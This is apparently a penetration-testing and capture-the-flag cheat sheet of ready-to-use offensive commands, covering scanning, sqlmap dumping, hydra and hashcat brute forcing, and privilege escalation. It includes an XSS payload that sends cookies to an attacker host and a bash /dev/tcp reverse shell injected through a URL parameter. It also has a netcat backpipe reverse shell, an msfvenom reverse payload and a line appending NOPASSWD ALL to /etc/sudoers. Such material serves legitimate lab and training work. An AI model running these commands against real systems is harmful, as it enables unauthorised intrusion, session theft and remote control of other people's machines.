
# Table of Contents

* [Networking](#Networking)
* [Port Scanning](#Port-Scanning)
* [WEB Analysis](#WEB-Analysis)
* [WordPress](#WordPress)
* [AWS S3](#AWS-S3)
* [WEB Server](#WEB-Server)
* [XSS](#XSS)
* [SQL Injection](#SQL-Injection)
* [HTTP](#HTTP)
* [FTP](#FTP)
* [SMB](#SMB)
* [Pop3](#Pop3)
* [SSH](#SSH)
* [SCP](#SCP)
* [MySQL](#MySQL)
* [NFS](#NFS)
* [RDP](#RDP)
* [Hash Analysis](#Hash-Analysis)
* [Brute Force](#Brute-Force)
* [Shell Spawn](#Shell-Spawn)
* [SUID](#SUID)
* [Sudo](#Sudo)
* [Sudoers](#Sudoers)
* [Netcat](#Netcat)
* [Payloads](#Payloads)
* [Linux Password](#Linux-Password)
* [Custom Wordlists](#Custom-Wordlists)
* [Steganography](#Steganography)
* [Crontab](#Crontab)
* [Base64](#Base64)
* [Base32](#Base32)
* [GPG](#GPG)
* [OpenSSL](#OpenSSL)
* [Binary to ASCII](#Binary-to-ASCII)
* [Hex to ASCII](#Hex-to-ASCII)
* [ASCII to Char](#ASCII-to-Char)
* [Extract All File in Directory](#Extract-All-File-in-Directory)
* [Directory Files Iteration](#Directory-Files-Iteration)

# Networking

### Host Discovery

```
netdiscover -r {NETWORK}/{MASK}
```

```
nmap -sV {NETWORK}/{MASK}
```

# Port Scanning

### Nmap

```
# Simple Scan
nmap {TARGET}

# Port Range Scan
nmap -p {MIN}-{MAX} {TARGET}

# All Ports Scan
nmap -p- {TARGET}

# Complete Scan
nmap -AT4 -p- {TARGET}

# Script Scan
nmap --script=vuln {TARGET}
```



















# WEB Analysis

### Nikto

```
nikto -h {TARGET}
```

### Dirb

```
dirb {TARGET}
```

### GoBuster

```
gobuster dir -t 50 -u {TARGET} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.js,/,.html

gobuster dir -t 50 -u {TARGET} -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x .php,.txt,.js,/,.html --wildcard
```

# WordPress

### Analysis

```
# Simple Scan
wpscan --url {TARGET}

# Complete Scan
wpscan -e ap,at --url {TARGET}

# Looking for vulnerabilities
wpscan -e vp,vt --url {TARGET}

# User Enummeration
wpscan -e u --url {TARGET}
```

### Update Datase Password Hash

```
echo -n "password" | md5sum
5f4dcc3b5aa765d61d8327deb882cf99

mysql> UPDATE {TABLE} SET {FIELD}='5f4dcc3b5aa765d61d8327deb882cf99' WHERE ID={ID};
```

# AWS S3

### List Bucket Files

```
curl {BUCKET_NAME}.s3.amazonaws.com | xmllint --format -
```

### Download File

```
curl {BUCKET_NAME}.s3.amazonaws.com/{FILE}
```

# WEB Server

```
# Server up in current directory
python -m SimpleHTTPServer 8080
python -m http.server 8080

# GET
wget http://{TARGET}:{PORT}/{URI}
curl http://{TARGET}:{PORT}/{URI}
```

# XSS

### Validation

```
<script>alert('XSS Works')</script>
</p><script>console.log("XSS Works")</script><p>
```

### Acquiring Cookies

```
nc -lvnp 80
</p><script>window.location = 'http://{LOCAL_IP}/page?param=' + document.cookie </script><p>
```

# SQL Injection

### Analysis

```
# login.req is a text file with a login POST intercepted by Burp
sqlmap -r login.req -p {POST_PARAMETER} --batch
```

### Navigation

```
sqlmap -r login.req -p u --batch --current-db
sqlmap -r login.req -p u --batch -D {DB} --tables
sqlmap -r login.req -p u --batch -D {DB} -T {TABLE} --columns
sqlmap -r login.req -p u --batch -D {DB} -T {TABLE} -C {FIELD_1},{FIELD_2},{FIELD_3} --dump
```



















# HTTP

### URL Scapping

```
# %20 = Space
# %2f = /
curl http://example.com/api/cmd/ls%20%2fhome
```

### Reverse Shell Example

```
# Listen
nc -lvnp {LOCAL_PORT}

# Request with: bash -i >& /dev/tcp/{LOCAL_IP}/{LOCAL_PORT} 0>&1
http://example.com/api/cmd/bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{LOCAL_IP}%2F{LOCAL_PORT}%200%3E%261
```

# FTP

```
# Access
ftp {TARGET}

# Download file to current directory
ftp> ls
ftp> get {FILE}

# Download multiples file to current directory
ftp> mget {DIRECTORY}

# pwd
ftp> pwd
```

# SMB

```
# Disks list
smbmap -H {TARGET}

# Connection
smbclient //{TARGET}/{DISK}

# Download file to current directory
smb: \> dir
smb: \> get {FILE}
```

# Pop3

```
# Connection
nc {TARGET} pop3

# Actions
> LIST
> RETR {ID}
```

# SSH

```
# Password Auth
ssh {USER}@{IP}

# Key Auth in specific port
ssh {USER}@{IP} -i {KEY} -p {PORT}
```

# SCP

```
# Local to remote
scp {LOCAL_PATH} {USER}@{IP}:{REMOTE_PATH}

# Remote to Local
scp {USER}@{IP}:{REMOTE_PATH} {LOCAL_PATH}

# Key Auth in Specific Port
scp -i {KEY} -p {PORT} {USER}@{IP}:{REMOTE_PATH} {LOCAL_PATH}
```

# MySQL

### Connection

```
mysql -u {USER} -h {TARGET} -p {PASSWORD}
```

### Actions

```
mysql> show databases;
mysql> user {DATABASE};
mysql> show tables;
mysql> SELECT {FIELD_1},{FIELD_2} FROM {TABLE};
```

# NFS

### List Mount Points

```
showmount -e {TARGET}
```

### Mount

```
mount {TARGET}:{MOUNT_POINT} {LOCAL_PATH}
```

### Umount

```
umount {LOCAL_PATH}
```

# RDP

```
xfreerdp /u:{USER} /p:{PASS} /v:{TARGET}
```



















# Hash Analysis

### Hash Identifier

```
hash-identifier {HASH}
```

### HashID

```
hashid -mj {HASH}
```

# Brute Force

### Hash

```
hashcat -m {MODE} {HASH_FILE} /usr/share/wordlists/rockyou.txt
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt {HASH_FILE} 
john --show {HASH_FILE}
```

### SSH

```
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET}
```

### ZIP

```
zip2john {ZIP_FILE} > {ZIP_FILE}.hash
john --wordlist='{WORDLIST_PATH}' {ZIP_FILE}.hash
john --show {ZIP_FILE}.hash
```

```
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' {ZIP_FILE}
```

### WordPress Login

```
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt -vV -f -t 4 {TARGET} http-post-form "/weblog/wp-login.php:log=^USER^&pwd=^PASS^:login_error"
```

```
wpscan --url {TARGET} -U {USERS_LIST} -P /usr/share/wordlists/rockyou.txt
```

### Pop3

```
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} -f pop3
```

### MySQL

```
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} -f -t 32 mysql
```



















# Shell Spawn

### Python

```
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

# SUID

```
find / -type f -perm -u=s 2>/dev/null
```

# Sudo

### List Policy

```
sudo -l
```

### Run as User

```
sudo -u {USER} {COMMAND}
```

# Sudoers

```
# {USER} ALL=(ALL) NOPASSWD: ALL
echo "{USER} ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

# Netcat

### Listen

```
nc -lcnp {PORT}
```

### Reverse Shell Using Backpipe

```
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc 192.168.1.116 4444 1>/tmp/backpipe
```

# Payloads

### Linux Reverse Python Raw

```
msfvenom -p cmd/unix/reverse_python LHOST={HOST_IP} LPORT={HOST_PORT} -f raw
```

# Linux Password

### Password Hash

```
openssl passwd -1 -salt root root
$1$root$9gr5KxwuEdiI80GtIzd.U0
```

# Custom Wordlists

### Cewl

```
cewl http://192.168.1.101/index.html > wordlist.txt
cewl {FILE} > wordlist.txt
cewl {URL} > wordlist.txt
```

# Steganography

### Exiftool

```
exiftool {FILE}
```

### Steghide

```
steghide extract -sF {FILE}
```

# Crontab

### List Jobs

```
crontab -l
cat /etc/crontab
```

### Edit

```
crontab -e

# * * * * * <command to be executed>
# - - - - -
# | | | | |
# | | | | ----- Weekday (0 - 7) (Sunday is 0 or 7, Monday is 1...)
# | | | ------- Month (1 - 12)
# | | --------- Day (1 - 31)
# | ----------- Hour (0 - 23)
# ------------- Minute (0 - 59)
```



















# Base64

### Encoding

```
base64 {FILE}
base64 "{DATA}"
cat {FILE} | base64
echo "{DATA}" | base64
```

### Decoding

```
base64 -d {FILE}
base64 -d "{DATA}"
cat {FILE} | base64 -d
echo "{DATA}" | base64 -d
```

# Base32

### Encoding

```
base32 {FILE}
base32 "{DATA}"
cat {FILE} | base32
echo "{DATA}" | base32
```

### Decoding

```
base32 -d {FILE}
base32 -d "{DATA}"
cat {FILE} | base32 -d
echo "{DATA}" | base32 -d
```

# GPG

### Decrypt

```
gpg -d {GPG_FILE}
```

# OpenSSL

### Decrypt RSA

```
openssl rsautl -decrypt -inkey {PRIV_KEY} -in {ENCRYPTED_FILE} -out {DECRYPTED_FILE}
```



















# Binary to ASCII

```
$ cat bin.txt
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010

$ cat bin2ascii.sh

#!/bin/bash
ARRAY=$(cat $1)
for bin in $ARRAY
do
	dec=$((2#${bin}))
	echo -ne \\x$(printf %02x $dec)
done
```

# Hex to ASCII

```
echo {HEX_TEXT} | xxd -r -p
```

# ASCII to Char

```
$ cat ascii2char.c

#include <stdlib.h>
#include <stdio.h>

void main(void) {
	int ascii[] = {117, 115, 101, 32, 114, 111, 99, 107, 121, 111, 117, 46, 116, 120, 116};
	for (int i=0; i<sizeof(ascii)/sizeof(int); i++) printf("%c", ascii[i]);
	printf("\n");
}

gcc ascii2char.c -o ascii2char.o && ./ascii2char.o
```

# Extract All File in Directory

```
import os
import zipfile

filesList = os.listdir("./extract")

for file in filesList:
    filePath = './extract/' + str(file)
    with zipfile.ZipFile(filePath, 'r') as zipRef:
        zipRef.extractall('./extract_txt')
```

# Directory Files Iteration

```
#!/bin/bash

for file in ./path/*.txt ; do
	echo ${file}
done
```